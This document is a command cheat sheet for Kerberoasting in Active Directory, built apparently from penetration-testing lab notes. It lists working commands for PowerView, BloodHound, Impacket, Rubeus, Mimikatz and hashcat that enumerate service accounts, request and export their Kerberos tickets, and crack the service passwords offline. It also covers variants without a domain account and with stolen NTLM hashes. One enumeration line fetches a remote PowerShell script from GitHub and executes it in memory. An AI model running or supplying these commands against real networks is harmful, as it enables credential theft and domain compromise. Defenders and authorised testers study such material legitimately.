# Kerberoasting

### Get kerberoastable users

 - Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName

 - MATCH (u:User {hasspn:true}) RETURN u (Bloodhound cypher query)

 - MATCH (u:User {hasspn:true}), (c:Computer),p=shortestPath((u)-[*1..]->(c)) RETURN p (Bloodhound cypher query)

### Get hash (TGS)

 - Impacket-GetUserSPNs -request -dc-ip DC_IP DOMAIN/USER:PASSWORD

 - Rubeus kerberoast

### Allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password.

### Tools: Bloodhound, Invoke-Kerberoast.ps1, Kekeo, Rubeus, Hashcat

## Steps:

#### 1) python3 Impacket-GetUserSPNs.py -dc-ip DC_IP DOMAIN/USER:PASSWORD

#### Insert Password:

#### 2) python3 Impacket-GetUserSPNs.py -dc-ip DC_IP DOMAIN/USER:PASSWORD -request

#### 3) hashcat -a 0 -m 13100 SPN.HASH /path/to/wordlist.txt


# Kerberoasting 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `sudo python3 -m pip install .`                              | Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host. |
| `GetUserSPNs.py -h`                                          | Impacket tool used to display the options and functionality of `GetUserSPNs.py` from a Linux-based host. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday` | Impacket tool used to get a list of `SPNs` on the target Windows domain from  a Linux-based host. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request` | Impacket tool used to download/request (`-request`) all TGS tickets for offline processing from a Linux-based host. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev` | Impacket tool used to download/request (`-request-user`) a TGS ticket for a specific user account (`sqldev`) from a Linux-based host. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs` | Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (`-outputfile sqldev_tgs`) linux-based host. |
| `hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force` | Attempts to crack the Kerberos (`-m 13100`) ticket hash (`sqldev_tgs`) using `hashcat` and a wordlist (`rockyou.txt`) from a Linux-based host. |
| `setspn.exe -Q */*`                                          | Used to enumerate `SPNs` in a target Windows domain from a Windows-based host. |
| `Add-Type -AssemblyName System.IdentityModel  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"` | PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host. |
| `setspn.exe -T INLANEFREIGHT.LOCAL -Q */* \| Select-String '^CN' -Context 0,1 \| % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }` | Used to download/request all TGS tickets from a WIndows-based host. |
| `mimikatz # base64 /out:true`                                | `Mimikatz` command that ensures TGS tickets are extracted in `base64` format from a Windows-based host. |
| `kerberos::list /export `                                    | `Mimikatz` command used to extract the TGS tickets from a Windows-based host. |
| `echo "<base64 blob>" \|  tr -d \\n `                         | Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host. |
| `cat encoded_file \| base64 -d > sqldev.kirbi`                 | Used to output a file (`encoded_file`) into a .kirbi file in base64 (`base64 -d > sqldev.kirbi`) format from a Linux-based host. |
| `python2.7 kirbi2john.py sqldev.kirbi`                       | Used to extract the `Kerberos ticket`. This also creates a file called `crack_file` from a Linux-based host. |
| `sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat` | Used to modify the `crack_file` for `Hashcat` from a Linux-based host. |
| `cat sqldev_tgs_hashcat `                                    | Used to view the prepared hash from a Linux-based host.      |
| `hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt ` | Used to crack the prepared Kerberos ticket hash (`sqldev_tgs_hashcat`) using a wordlist (`rockyou.txt`) from a Linux-based host. |
| `Import-Module .\PowerView.ps1  Get-DomainUser * -spn \| select samaccountname` | Uses PowerView tool to extract `TGS Tickets` . Performed from a Windows-based host. |
| `Get-DomainUser -Identity sqldev \| Get-DomainSPNTicket -Format Hashcat` | PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for `Hashcat` from a Windows-based host. |
| `Get-DomainUser * -SPN \| Get-DomainSPNTicket -Format Hashcat \| Export-Csv .\ilfreight_tgs.csv -NoTypeInformation` | Exports all TGS tickets to a `.CSV` file (`ilfreight_tgs.csv`) from a Windows-based host. |
| `cat .\ilfreight_tgs.csv`                                    | Used to view the contents of the .csv file from a Windows-based host. |
| `.\Rubeus.exe`                                               | Used to view the options and functionality possible with the tool `Rubeus`. Performed from a Windows-based host. |
| `.\Rubeus.exe kerberoast /stats`                             | Used to check the kerberoast stats (`/stats`) within the target Windows domain from a Windows-based host. |
| `.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap` | Used to request/download TGS tickets for accounts with the `admin` count set to `1` then formats the output in an easy to view & crack manner (`/nowrap`) . Performed from a Windows-based host. |
| `.\Rubeus.exe kerberoast /user:testspn /nowrap`              | Used to request/download a TGS ticket for a specific user (`/user:testspn`) the formats the output in an easy to view & crack manner (`/nowrap`). Performed from a Windows-based host. |
| `Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes` | PowerView tool used to check the `msDS-SupportedEncryptionType` attribute associated with a specific user account (`testspn`). Performed from a Windows-based host. |
| `hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt` | Used to attempt to crack the ticket hash using a wordlist (`rockyou.txt`) from a Linux-based host . |


# Kerberoasting without domain account

## Linux

    GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"

## Windows

    Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"

# Kerberoastable users enumeration

## Windows

    setspn.exe -Q */* (This is a built-in binary. Focus on user accounts)

    setspn -T [Domain] -Q */* (    Gets all SPNs, Includes machine account SPNs)

    Get-DomainUser -SPN | Select SamAccountName,DisplayName,ServicePrincipalName (Powerview)

    .\Rubeus.exe kerberoast /stats

    iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/RedTeam-Pentest-Tools/main/Kerberoasting/Get-SPNs.ps1")

## Linux (Metaploit, Impacket, https://github.com/skelsec/kerberoast)

    msf> use auxiliary/gather/get_user_spns (Metasploit)

    GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast  (Password will be prompted)

    GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast

    kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable ( 1. Enumerate kerberoastable users)

    kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes ( 2. Dump hashes)


# Targeted Kerberoasting

## Github repo: https://github.com/ShutdownRepo/targetedKerberoast

